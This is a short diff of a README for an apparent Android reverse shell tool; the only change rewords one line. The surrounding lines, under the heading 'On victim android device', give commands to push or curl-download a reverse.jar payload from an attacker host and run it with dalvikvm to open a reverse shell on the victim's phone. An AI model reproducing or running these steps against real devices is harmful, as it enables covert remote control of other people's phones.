@@ -22,7 +22,7 @@ UPDATED WITH SSL SUPPORT https://github.com/CalfCrusher/JavaAndroidReverseShell/
 ## On victim android device:
 `adb push reverse.jar /sdcard` (if Android Debug Tools is enabled)
 
-You can just use DalvikVM bash script from Termux:
+or you can just use dalvikvm from Termux:
 
 `curl http://attackingmachine:9999/reverse.jar -o /sdcard/reverse.jar`<br/>
 `cd /system/bin/ && ./dalvikvm -cp /sdcard/reverse.jar AndroidReverseShell`
